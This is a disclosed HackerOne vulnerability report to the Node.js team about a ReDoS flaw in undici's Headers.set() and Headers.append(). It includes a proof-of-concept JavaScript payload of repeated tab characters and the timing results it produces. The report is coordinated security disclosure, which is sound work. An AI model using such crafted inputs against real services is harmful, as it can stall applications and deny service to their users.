# Regular Expression Denial of Service in Headers

## Report Details
- **Report ID**: 1784449
- **URL**: https://hackerone.com/reports/1784449
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-11-25T22:30:39.850Z
- **Disclosed**: 2023-03-19T17:11:28.970Z

## Reporter
- **Username**: sno2
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:** ReDoS vulnerabilities in Headers class.

**Description:** The `Headers.set()` and `Headers.append()` methods are vulnerable to Regular Expression Denial of Service (ReDoS) attacks when untrusted values are passed into the functions.  This is due to the inefficient regular expression used to normalize the values in the `headerValueNormalize()` utility function.

## Steps To Reproduce:

  1. Install undici (npm install undici@5.13)
  2. Run the following program:
```js
const { Headers } = require("undici");

const headers = new Headers();
const attack = "a" + "\t".repeat(50_000) + "\ta";
const start = performance.now();
headers.append("foo", attack);
console.log(`${performance.now() - start}ms`);
```

## Impact: The code takes almost 3 seconds to run because of the inefficient regular expression used in `Headers.append()`

## Supporting Material/References:
  * Cause of vulnerability: https://github.com/nodejs/undici/blob/main/lib/fetch/headers.js#L18-L30
  * Both the `Headers.set()` and `Headers.append()` functions are affected.
```js
const { Headers } = require("undici");

console.log("Headers.set()");
for (let i = 0; i <= 5; i++) {
  const headers = new Headers();
  const attack = "a" + "\t".repeat(i * 10_000) + "\ta";
  const start = performance.now();
  headers.set("foo", attack);
  console.log(`${attack.length}: ${performance.now() - start}ms`);
}

console.log("\nHeaders.append()");
for (let i = 0; i <= 5; i++) {
  const headers = new Headers();
  const attack = "a" + "\t".repeat(i * 10_000) + "\ta";
  const start = performance.now();
  headers.append("foo", attack);
  console.log(`${attack.length}: ${performance.now() - start}ms`);
}
```

```txt
Headers.set()
3: 0.4767999998293817ms
10003: 108.30930000031367ms
20003: 417.9063999997452ms
30003: 949.7406999999657ms
40003: 1662.9593000002205ms
50003: 2645.8285000002943ms

Headers.append()
3: 0.27730000019073486ms
10003: 111.98060000035912ms
20003: 430.24649999989197ms
30003: 996.5332000004128ms
40003: 1706.5194999999367ms
50003: 2932.2003999999724ms
```

## Impact

An attacker can immobilize an unsuspecting user of this package for a few seconds if untrusted input is passed into the unsafe `Headers` methods.

## Attachments
No attachments
